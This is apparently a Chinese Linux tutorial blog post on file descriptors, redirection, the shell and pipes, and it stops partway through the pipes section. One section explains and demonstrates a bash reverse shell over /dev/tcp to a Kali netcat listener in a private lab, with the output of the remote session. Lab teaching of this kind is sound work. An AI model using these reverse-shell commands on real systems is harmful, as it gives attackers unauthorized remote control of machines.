{"title":"重定向和管道","uid":"af2db19dd72297d09de218eff118e887","slug":"重定向和管道","date":"2025-08-05T09:02:38.000Z","updated":"2025-08-05T11:34:37.578Z","comments":true,"path":"api/articles/重定向和管道.json","keywords":null,"cover":[],"content":"<h1 id=\"重定向和管道\"><a href=\"#重定向和管道\" class=\"headerlink\" title=\"重定向和管道\"></a>重定向和管道</h1><h2 id=\"一、重定向\"><a href=\"#一、重定向\" class=\"headerlink\" title=\"一、重定向\"></a>一、重定向</h2><h3 id=\"1-文件描述符（FD）\"><a href=\"#1-文件描述符（FD）\" class=\"headerlink\" title=\"1.文件描述符（FD）\"></a>1.文件描述符（FD）</h3><p>定义：在 Linux 中，文件描述符（File Descriptor）是一个非负整数，用于唯一标识一个进程（程序） 打开的文件、管道、网络连接或其他 I&#x2F;O 资源。它是操作系统管理 I&#x2F;O 操作的抽象句柄。 </p>\n<p>本质：可以理解为操作系统为每个进程维护的“通道号码”，通过这个号码访问具体的 I&#x2F;O 资源。</p>\n<h3 id=\"2-标准输入、标准输出、标准错误输出\"><a href=\"#2-标准输入、标准输出、标准错误输出\" class=\"headerlink\" title=\"2.标准输入、标准输出、标准错误输出\"></a>2.标准输入、标准输出、标准错误输出</h3><p>Linux 为每个进程默认打开三个标准流（Standard Streams），对应三个文件描述符： </p>\n<p>1.标准输入（stdin, FD 0）： </p>\n<p>​\t默认来源：键盘输入。 </p>\n<p>​\t用途：程序从 stdin 读取输入数据。 </p>\n<p>2.标准输出（stdout, FD 1）： </p>\n<p>​\t默认去向：终端屏幕。 </p>\n<p>​\t用途：程序向 stdout 输出正常结果。 </p>\n<p>3.标准错误输出（stderr, FD 2）： </p>\n<p>​\t默认去向：终端屏幕。 </p>\n<p>​\t用途：程序向 stderr 输出错误信息（与正常结果分离）。</p>\n<p>举个例子：通过我们非常熟悉的VIM程序。来观察一个进程的FD信息 </p>\n<p>​\t1.通过一个终端，打开一个文本。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@wyf 桌面]# vim 111.txt</span><br></pre></td></tr></table></figure>\n\n<p>​\t2.通过另一个终端，查询文本程序的进程号</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@wyf 桌面]# ps  aux| grep vim</span><br><span class=\"line\">root       8133  0.0  0.2  46596  8604 pts/0    S+   18:23   0:00 vim 111.txt</span><br><span class=\"line\">root       8170  0.0  0.0  12320   976 pts/1    S+   18:23   0:00 grep --color=auto vim</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/Five0ne15/picgo_pic@main/picgo_picture/image-20250805182615147.png\" alt=\"image-20250805182615147\"></p>\n<p>​\t3.在 &#x2F;proc 目录中查看文本程序的FD，通常在 &#x2F;proc&#x2F;PID&#x2F;fd  就能看到文件的FD调用情况。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@wyf 桌面]# <span class=\"built_in\">cd</span> ..</span><br><span class=\"line\">[root@wyf ~]# <span class=\"built_in\">cd</span> /proc/8133</span><br><span class=\"line\">[root@wyf 8133]# <span class=\"built_in\">ls</span>                       <span class=\"comment\">## fd  就是PID号为8133进程vim的文件描述符</span></span><br><span class=\"line\">attr             exe        mounts         projid_map    status</span><br><span class=\"line\">autogroup        fd         mountstats     root          syscall</span><br><span class=\"line\">auxv             fdinfo     net            <span class=\"built_in\">sched</span>         task</span><br><span class=\"line\">cgroup           gid_map    ns             schedstat     timers</span><br><span class=\"line\">clear_refs       io         numa_maps      sessionid     timerslack_ns</span><br><span class=\"line\">cmdline          limits     oom_adj        setgroups     uid_map</span><br><span class=\"line\"><span class=\"built_in\">comm</span>             loginuid   oom_score      smaps         wchan</span><br><span class=\"line\">coredump_filter  map_files  oom_score_adj  smaps_rollup</span><br><span class=\"line\">cpuset           maps       pagemap        stack</span><br><span class=\"line\">cwd              mem        patch_state    <span class=\"built_in\">stat</span></span><br><span class=\"line\">environ          mountinfo  personality    statm</span><br><span class=\"line\">[root@wyf 8133]# <span class=\"built_in\">cd</span> fd</span><br><span class=\"line\">[root@wyf fd]# <span class=\"built_in\">ls</span></span><br><span class=\"line\">0  1  2  3  4  6</span><br><span class=\"line\">[root@wyf fd]# </span><br></pre></td></tr></table></figure>\n\n<p>​\t4.使用 ll 命令查看一下句柄</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@wyf fd]# ll</span><br><span class=\"line\">总用量 0</span><br><span class=\"line\">lrwx------. 1 root root 64 8月   5 18:27 0 -&gt; /dev/pts/0</span><br><span class=\"line\">lrwx------. 1 root root 64 8月   5 18:27 1 -&gt; /dev/pts/0</span><br><span class=\"line\">lrwx------. 1 root root 64 8月   5 18:27 2 -&gt; /dev/pts/0</span><br><span class=\"line\">lr-x------. 1 root root 64 8月   5 18:27 3 -&gt; /var/lib/sss/mc/passwd</span><br><span class=\"line\">lrwx------. 1 root root 64 8月   5 18:27 4 -&gt; <span class=\"string\">&#x27;socket:[111322]&#x27;</span></span><br><span class=\"line\">lrwx------. 1 root root 64 8月   5 18:27 6 -&gt; /root/桌面/.111.txt.swp</span><br></pre></td></tr></table></figure>\n\n<p>​\t5.&#x2F;dev&#x2F;pts&#x2F;0 是我之前打开vim的终端，用执行 ps 命令的终端输入，可以将标准输出重定向 到&#x2F; dev&#x2F;pts&#x2F;0</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@wyf fd]# <span class=\"built_in\">echo</span> 111111 &gt;&gt; /dev/pts/0</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/Five0ne15/picgo_pic@main/picgo_picture/image-20250805183023458.png\" alt=\"image-20250805183023458\"></p>\n<p> 6.&#x2F;root&#x2F;.111.txt.swp 是编辑文件时产生的临时文件</p>\n<p>​\t(1) 正常保存退出</p>\n<p>​\t\t行为：编辑器会将修改写入源文件（如  1.txt ），删除交换文件（ .111.txt.swp ）。</p>\n<p>​\t\t结果：源文件更新，交换文件消失。 </p>\n<p>​\t(2) 不保存退出（如  :q! ） </p>\n<p>​\t\t行为：编辑器会丢弃所有未保存的修改，删除交换文件。 </p>\n<p>​\t\t结果：源文件保持原样，交换文件消失。</p>\n<p>​\t (3) 意外退出（如崩溃、断网） </p>\n<p>​\t\t行为：交换文件保留，下次打开文件时，编辑器会提示：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">发现交换文件 <span class=\"string\">&quot;.111.txt.swp&quot;</span></span><br><span class=\"line\">选择: (R)恢复修改, (D)删除交换文件, (Q)退出, (A)终止</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t恢复操作：</p>\n<p>​\t\t\t选择 R（恢复）：将交换文件内容加载到编辑器，合并未保存的修改。 </p>\n<p>​\t\t\t选择 D（删除交换文件）：放弃恢复，直接编辑源文件。</p>\n<h3 id=\"3-总结\"><a href=\"#3-总结\" class=\"headerlink\" title=\"3.总结\"></a>3.总结</h3><p>看到的012就是FD，程序通过描述符访问文件，可以是常规文件，也可以是设备文件。</p>\n<h3 id=\"4-重定向练习\"><a href=\"#4-重定向练习\" class=\"headerlink\" title=\"4.重定向练习\"></a>4.重定向练习</h3><p><img src=\"https://cdn.jsdelivr.net/gh/Five0ne15/picgo_pic@main/picgo_picture/image-20250805183543849.png\" alt=\"image-20250805183543849\"></p>\n<h4 id=\"1-输出重定向及综合案例\"><a href=\"#1-输出重定向及综合案例\" class=\"headerlink\" title=\"1.输出重定向及综合案例\"></a>1.输出重定向及综合案例</h4><h5 id=\"案例1：输出重定向\"><a href=\"#案例1：输出重定向\" class=\"headerlink\" title=\"案例1：输出重定向\"></a>案例1：输出重定向</h5><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@wyf 桌面]# <span class=\"built_in\">date</span> &gt; date.txt</span><br><span class=\"line\">[root@wyf 桌面]# <span class=\"built_in\">cat</span> date.txt</span><br><span class=\"line\">2025年 08月 05日 星期二 18:37:30 CST</span><br><span class=\"line\">[root@wyf 桌面]# <span class=\"built_in\">date</span> &gt;&gt; date.txt</span><br><span class=\"line\">[root@wyf 桌面]# <span class=\"built_in\">cat</span> date.txt</span><br><span class=\"line\">2025年 08月 05日 星期二 18:37:30 CST</span><br><span class=\"line\">2025年 08月 05日 星期二 18:37:55 CST</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@wyf 桌面]# <span class=\"built_in\">mkdir</span> 333 1&gt; 333.txt      <span class=\"comment\">#1表示正确输出</span></span><br><span class=\"line\">[root@wyf 桌面]# <span class=\"built_in\">cat</span> 333.txt </span><br><span class=\"line\">[root@wyf 桌面]# <span class=\"built_in\">mkdir</span> 444 -v 1&gt; 444.txt</span><br><span class=\"line\">[root@wyf 桌面]# <span class=\"built_in\">cat</span> 444.txt </span><br><span class=\"line\"><span class=\"built_in\">mkdir</span>: 已创建目录 <span class=\"string\">&#x27;444&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<h5 id=\"案例2：错误输出重定向\"><a href=\"#案例2：错误输出重定向\" class=\"headerlink\" title=\"案例2：错误输出重定向\"></a>案例2：错误输出重定向</h5><p>当某条命令产生错误时，才会有错误输出。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@wyf 桌面]# <span class=\"built_in\">ls</span> /aaaaaaa 2&gt; error.txt   <span class=\"comment\">#2表示错误输出</span></span><br><span class=\"line\">[root@wyf 桌面]# <span class=\"built_in\">cat</span> error.txt </span><br><span class=\"line\"><span class=\"built_in\">ls</span>: 无法访问<span class=\"string\">&#x27;/aaaaaaa&#x27;</span>: 没有那个文件或目录</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"案例3：-正确和错误都输入到相同位置\"><a href=\"#案例3：-正确和错误都输入到相同位置\" class=\"headerlink\" title=\"案例3： 正确和错误都输入到相同位置\"></a>案例3： 正确和错误都输入到相同位置</h5><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@wyf 桌面]# <span class=\"built_in\">ls</span> /home/ /aaaaaa &amp;&gt;&gt; error.txt</span><br><span class=\"line\">[root@wyf 桌面]# <span class=\"built_in\">cat</span> error.txt </span><br><span class=\"line\"><span class=\"built_in\">ls</span>: 无法访问<span class=\"string\">&#x27;/aaaaaa&#x27;</span>: 没有那个文件或目录</span><br><span class=\"line\">/home/:</span><br><span class=\"line\">wyf</span><br><span class=\"line\">[root@wyf 桌面]# <span class=\"built_in\">ls</span> /home /aaaaaaa &gt;&amp; error.txt</span><br><span class=\"line\">[root@wyf 桌面]# <span class=\"built_in\">cat</span> error.txt </span><br><span class=\"line\"><span class=\"built_in\">ls</span>: 无法访问<span class=\"string\">&#x27;/aaaaaaa&#x27;</span>: 没有那个文件或目录</span><br><span class=\"line\">/home:</span><br><span class=\"line\">wyf</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"案例4：将-stdout-和-stderr-分别重定向到不同文件\"><a href=\"#案例4：将-stdout-和-stderr-分别重定向到不同文件\" class=\"headerlink\" title=\"案例4：将 stdout 和 stderr 分别重定向到不同文件\"></a>案例4：将 stdout 和 stderr 分别重定向到不同文件</h5><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@wyf 桌面]# <span class=\"built_in\">ls</span> /home/ /aaaaaa 1&gt; output.txt 2&gt;error.txt</span><br><span class=\"line\">[root@wyf 桌面]# <span class=\"built_in\">cat</span> output.txt </span><br><span class=\"line\">/home/:</span><br><span class=\"line\">wyf</span><br><span class=\"line\">[root@wyf 桌面]# <span class=\"built_in\">cat</span> error.txt </span><br><span class=\"line\"><span class=\"built_in\">ls</span>: 无法访问<span class=\"string\">&#x27;/aaaaaa&#x27;</span>: 没有那个文件或目录</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"案例5：将-stderr-合并到-stdout，再一起重定向到文件\"><a href=\"#案例5：将-stderr-合并到-stdout，再一起重定向到文件\" class=\"headerlink\" title=\"案例5：将 stderr 合并到 stdout，再一起重定向到文件\"></a>案例5：将 stderr 合并到 stdout，再一起重定向到文件</h5><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@wyf 桌面]# <span class=\"built_in\">ls</span> /home/ /aaaaaa &gt;all.log 2&gt;&amp;1   <span class=\"comment\">##&amp;1表示文件描述符1而不是文件1</span></span><br><span class=\"line\">[root@wyf 桌面]# <span class=\"built_in\">cat</span> all.log </span><br><span class=\"line\"><span class=\"built_in\">ls</span>: 无法访问<span class=\"string\">&#x27;/aaaaaa&#x27;</span>: 没有那个文件或目录</span><br><span class=\"line\">/home/:</span><br><span class=\"line\">wyf</span><br><span class=\"line\"> <span class=\"comment\">#为什么不直接用`&amp;&gt;`</span></span><br><span class=\"line\">兼容性问题:&amp;&gt; 是 •Bash 的扩展语法，并非所有 Shell 都支持，而 &gt; file 2&gt;&amp;1 是 POSIX 标准语法，兼容性更广  (而且显得更有水平，逻辑性更强！)</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"2-输入重定向及结合案例\"><a href=\"#2-输入重定向及结合案例\" class=\"headerlink\" title=\"2.输入重定向及结合案例\"></a>2.输入重定向及结合案例</h4><h5 id=\"案例：利用-cat-将输入文字输出到-catfile-中，-当输入-eof-时就结束\"><a href=\"#案例：利用-cat-将输入文字输出到-catfile-中，-当输入-eof-时就结束\" class=\"headerlink\" title=\"案例：利用 cat 将输入文字输出到 catfile 中， 当输入 eof 时就结束\"></a>案例：利用 cat 将输入文字输出到 catfile 中， 当输入 eof 时就结束</h5><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@wyf 桌面]# <span class=\"built_in\">cat</span> &gt;catfile &lt;&lt;<span class=\"string\">&quot;eof&quot;</span></span><br><span class=\"line\">&gt; asdfffads</span><br><span class=\"line\">&gt; adsSFdff</span><br><span class=\"line\">&gt; eof</span><br><span class=\"line\">[root@wyf 桌面]# <span class=\"built_in\">cat</span> catfile </span><br><span class=\"line\">asdfffads</span><br><span class=\"line\">adsSFdff</span><br><span class=\"line\">[root@wyf 桌面]# </span><br></pre></td></tr></table></figure>\n\n<h2 id=\"二、bash反弹shell\"><a href=\"#二、bash反弹shell\" class=\"headerlink\" title=\"二、bash反弹shell\"></a>二、bash反弹shell</h2><h3 id=\"1-什么是内核（kernel\"><a href=\"#1-什么是内核（kernel\" class=\"headerlink\" title=\"1.什么是内核（kernel)\"></a>1.什么是内核（kernel)</h3><p>定义： </p>\n<p>​\t内核是操作系统的核心，直接管理计算机的硬件资源（CPU、内存、硬盘、网络等）。 </p>\n<p>职责：  </p>\n<p>​\t调度进程（决定哪个程序使用 CPU）。 </p>\n<p>​\t管理内存分配。 </p>\n<p>​\t控制硬件设备（如读写磁盘、处理网络请求）。 </p>\n<p>比喻：</p>\n<p>​\t内核就像一家公司的 CEO，负责所有核心决策和资源分配，但不直接面对普通员工（用户）。 </p>\n<h3 id=\"2-什么是shell-GNU-GNU-NOT-UNIX\"><a href=\"#2-什么是shell-GNU-GNU-NOT-UNIX\" class=\"headerlink\" title=\"2.什么是shell GNU &#x3D; GNU NOT UNIX\"></a>2.什么是shell GNU &#x3D; GNU NOT UNIX</h3><p>定义： </p>\n<p>​\tShell 是用户与内核交互的“桥梁”，是一个命令行解释器。 </p>\n<p>职责： </p>\n<p>​\t接收用户输入的命令（如 ls、 cat ）。 </p>\n<p>​\t将命令翻译成内核能理解的操作。 </p>\n<p>​\t将内核的执行结果返回给用户。 </p>\n<p>常见 Shell 类型： </p>\n<p>​\tBash（Bourne-Again Shell）：Linux 系统默认的 Shell。 </p>\n<p>​\tZsh（Z Shell）：功能更强大的现代 Shell（如 Oh My Zsh）。 </p>\n<p>​\tFish：对新手友好的 Shell。 </p>\n<p>比喻： </p>\n<p>​\tShell 就像公司的中层经理，负责将员工的请求（用户命令）传达给 CEO（内核），再将 CEO 的反馈返 回给员工。 </p>\n<h3 id=\"3-什么是bash\"><a href=\"#3-什么是bash\" class=\"headerlink\" title=\"3.什么是bash\"></a>3.什么是bash</h3><p>定义： </p>\n<p>​\tBash 是 Shell 的一种具体实现，全称是 Bourne-Again Shell。 </p>\n<p>特点：  </p>\n<p>​\t支持命令历史、自动补全、脚本编程等。 </p>\n<p>​\tLinux 和 macOS 的默认 Shell（Windows 可通过 WSL 或 Git Bash 使用）。 </p>\n<p>示例：</p>\n<p>​\t当你在终端输入  ls -l，Bash 会： </p>\n<p>​\t1.解析命令。 </p>\n<p>​\t2.调用内核的“列出文件”功能。 </p>\n<p>​\t3.将结果（文件列表）输出到屏幕。 </p>\n<p>比喻：</p>\n<p>​\tBash 就像某个 特定部门的高效经理，既能处理常规任务（一些命令：echo、ls等），又能执行复杂流 程（如脚本）</p>\n<h3 id=\"4-三者的关系\"><a href=\"#4-三者的关系\" class=\"headerlink\" title=\"4.三者的关系\"></a>4.三者的关系</h3><p>bash 是 shell 的一种</p>\n<p>​\t1. 用户输入：在终端输入  cat file.txt。bash 命令</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1、<span class=\"built_in\">cat</span>命令生成一个临时进程</span><br><span class=\"line\">2、/proc/进程号/fd</span><br><span class=\"line\">3、 0 1 2</span><br><span class=\"line\">4、/dev/pts/1</span><br><span class=\"line\">5、保存并返回给终端</span><br></pre></td></tr></table></figure>\n\n<p>​\t2.Shell（Bash）解析：识别  cat 命令和参数  file.txt ，然后找到 </p>\n<p>​\t3.调用内核：bash 请求内核调用程序，并传递参数“  file.txt ”。 </p>\n<p>​\t4.内核执行： </p>\n<p>​\t\t检查文件权限。 </p>\n<p>​\t\t从硬盘读取文件数据。 </p>\n<p>​\t5.返回结果：内核将文件内容通过 Shell 返回给用户。</p>\n<h3 id=\"5-bash反弹shell\"><a href=\"#5-bash反弹shell\" class=\"headerlink\" title=\"5.bash反弹shell\"></a>5.bash反弹shell</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bash -i &gt;&amp; /dev/tcp/192.168.20.151/8080 0&gt;&amp;1</span><br></pre></td></tr></table></figure>\n\n<p>解读： </p>\n<p>​\tbash -i </p>\n<p>​\t\t打开一个交互的bash </p>\n<p>​\t&#x2F;dev&#x2F;tcp&#x2F; </p>\n<p>​\t\t是Linux中的一个特殊设备,打开这个文件就相当于发出了一个socket调用，建立一个socket连接， 读写这个文件就相当于在这个socket连接中传输数据。同理，Linux中还存在&#x2F;dev&#x2F;udp&#x2F; </p>\n<p>​\t&#x2F;dev&#x2F;tcp&#x2F;192.168.119.131&#x2F;1234    </p>\n<p>​\t\t向192.168.119.131 主机的1234端口发起连接 </p>\n<p>​\tbash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.119.131&#x2F;1234  </p>\n<p>​\t\t将标准输出和标准错误输出通过连接发送给192.168.119.131 </p>\n<p>​\tbash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.119.131&#x2F;1234 0&gt;&amp;1 </p>\n<p>​\t\t将标准输入，重定向到标准输出（也通过连接发送给192.168.20.151的8080端口）</p>\n<h3 id=\"6-实验\"><a href=\"#6-实验\" class=\"headerlink\" title=\"6.实验\"></a>6.实验</h3><h4 id=\"1-开启kali-使用nc工具监听1234端口\"><a href=\"#1-开启kali-使用nc工具监听1234端口\" class=\"headerlink\" title=\"1.开启kali,使用nc工具监听1234端口\"></a>1.开启kali,使用nc工具监听1234端口</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">┌──(root㉿kali)-[~]</span><br><span class=\"line\">└─# nc -lvnp 1234               </span><br><span class=\"line\">listening on [any] 1234 ...</span><br><span class=\"line\"><span class=\"comment\">#nc 是 •netcat 的缩写，被称为“网络瑞士军刀”，用于处理 TCP/UDP 网络连接。它的常见用途包括端口监听、端口扫描、文件传输、网络调试等。</span></span><br><span class=\"line\">-l  listen  •监听模式：等待传入连接（服务端模式）。</span><br><span class=\"line\">-v  verbose •详细输出：显示连接/通信的详细信息（如对方 IP、端口）。</span><br><span class=\"line\">-p  port    •指定端口：指定监听的端口号（某些版本中 -p 可省略，直接跟端口）。</span><br><span class=\"line\">-n           禁用dns解析</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"2-在Centos中，执行反弹shell的命令\"><a href=\"#2-在Centos中，执行反弹shell的命令\" class=\"headerlink\" title=\"2.在Centos中，执行反弹shell的命令\"></a>2.在Centos中，执行反弹shell的命令</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@wyf 桌面]# bash -i &gt;&amp; /dev/tcp/192.168.232.134/1234 0&gt;&amp;1</span><br></pre></td></tr></table></figure>\n\n<p>此时发现kali中返回了Centos 8 的终端页面，拿到了Centos 8 的执行权限</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">┌──(root㉿kali)-[~]</span><br><span class=\"line\">└─# nc -lvnp 1234  </span><br><span class=\"line\">listening on [any] 1234 ...</span><br><span class=\"line\">connect to [192.168.232.134] from (UNKNOWN) [192.168.232.145] 59660</span><br><span class=\"line\">[root@wyf 桌面]# hostname</span><br><span class=\"line\">hostname</span><br><span class=\"line\">wyf</span><br><span class=\"line\">[root@wyf 桌面]# </span><br></pre></td></tr></table></figure>\n\n<h4 id=\"3-在Centos中执行命令，结果输出到kali中\"><a href=\"#3-在Centos中执行命令，结果输出到kali中\" class=\"headerlink\" title=\"3.在Centos中执行命令，结果输出到kali中\"></a>3.在Centos中执行命令，结果输出到kali中</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@wyf 桌面]# bash &gt;&amp; /dev/tcp/192.168.232.134</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"三、管道\"><a href=\"#三、管道\" class=\"headerlink\" title=\"三、管道\"></a>三、管道</h2><h3 id=\"核心概念：\"><a href=\"#核心概念：\" class=\"headerlink\" title=\"核心概念：\"></a>核心概念：</h3><ul>\n<li><strong>什么是管道？</strong> 想象一条单向传输带。在 Linux 命令行中，<strong>管道（<code>|</code>）</strong> 就像一个连接命令的“传输带”。<strong>它允许你将一个命令（左侧）的标准输出（stdout）直接作为另一个命令（右侧）的标准输入（stdin）传递过去。</strong></li>\n<li><strong>目的：</strong> 管道使得<strong>组合多个单一用途的小命令</strong>来完成复杂任务变得简单、高效。遵循了 Unix&#x2F;Linux “<strong>一个程序只做好一件事，并做好</strong>” 的哲学。</li>\n<li><strong>单向流动：</strong> 数据通过管道<strong>从左向右</strong>流动。</li>\n<li><strong>临时性：</strong> 管道传递的数据是<strong>临时的</strong>，<strong>不会</strong>自动保存到磁盘文件（除非你将最终结果重定向到文件）。数据在内存中流过。</li>\n<li><strong>并行执行：</strong> 管道左右两侧的命令通常是<strong>同时启动</strong>和<strong>并行运行</strong>的。左侧命令产生的输出会立刻（或在其缓冲区满时）被右侧命令读取和处理。</li>\n</ul>\n<h3 id=\"如何表示和使用：\"><a href=\"#如何表示和使用：\" class=\"headerlink\" title=\"如何表示和使用：\"></a>如何表示和使用：</h3><p>管道在命令行中使用<strong>竖线符号 <code>|</code></strong> 表示。它的基本语法格式是：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">command1 [arguments] | command2 [arguments]</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><code>command1</code>：产生输出的命令。</li>\n<li><code>|</code>：管道符号。</li>\n<li><code>command2</code>：接收输入并进一步处理的命令。</li>\n</ul>\n<h3 id=\"关键特性与工作原理：\"><a href=\"#关键特性与工作原理：\" class=\"headerlink\" title=\"关键特性与工作原理：\"></a>关键特性与工作原理：</h3><ol>\n<li><p><strong>连接标准输出到标准输入：</strong> 这是最核心的。<code>command1</code> 将其原本应该显示在屏幕上的输出（stdout），通过管道传给了 <code>command2</code>，变成了 <code>command2</code> 的输入（stdin）。</p>\n</li>\n<li><p><strong>避免临时文件：</strong> 在没有管道的年代，要达成类似效果，你需要将 <code>command1</code> 的输出重定向（<code>&gt;</code>）到一个临时文件，然后再让 <code>command2</code> 从这个临时文件读取（<code>&lt;</code>）。管道让你一步到位，更简洁高效，减少了磁盘 I&#x2F;O。</p>\n</li>\n<li><p><strong>过滤、转换和组合：</strong></p>\n<p> 管道最常见的用途是让右侧的命令对左侧命令的输出进行：</p>\n<ul>\n<li><strong>过滤（Filtering）：</strong> 只保留符合条件的行（例如 <code>grep</code>）。</li>\n<li><strong>排序（Sorting）：</strong> 对输出行进行排序（例如 <code>sort</code>）。</li>\n<li><strong>统计（Summarizing）：</strong> 统计行数、字数等（例如 <code>wc</code>）。</li>\n<li><strong>格式转换（Transforming）：</strong> 修改输出的格式（例如 <code>sed</code>, <code>awk</code>, <code>tr</code>）。</li>\n<li><strong>分页查看（Paging）：</strong> 查看长输出（例如 <code>less</code>, <code>more</code>）。</li>\n<li><strong>合并结果：</strong> 将多个处理阶段串联起来。</li>\n</ul>\n</li>\n<li><p><strong>串联多个管道：</strong></p>\n<p> 你可以连接多个管道，形成复杂的处理流水线：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">command1 | command2 | command3 | ... | commandN</span><br></pre></td></tr></table></figure>\n\n<p>每个阶段的结果都作为下一个阶段的输入。</p>\n</li>\n<li><p><strong>仅传递标准输出：</strong> 管道只传递标准输出（stdout）。<strong>标准错误（stderr）</strong> 默认情况下<strong>不受管道影响</strong>，会直接打印到终端。如果需要处理错误，需要特殊操作（如 <code>2&gt;&amp;1</code>）。</p>\n</li>\n<li><p><strong>缓冲区：</strong> 内核为管道维护一个内存缓冲区。左侧命令向缓冲区写入，右侧命令从缓冲区读取。缓冲区的存在使得两侧命令可以不完全同步地运行。</p>\n</li>\n</ol>\n<h3 id=\"为什么管道如此重要和强大？\"><a href=\"#为什么管道如此重要和强大？\" class=\"headerlink\" 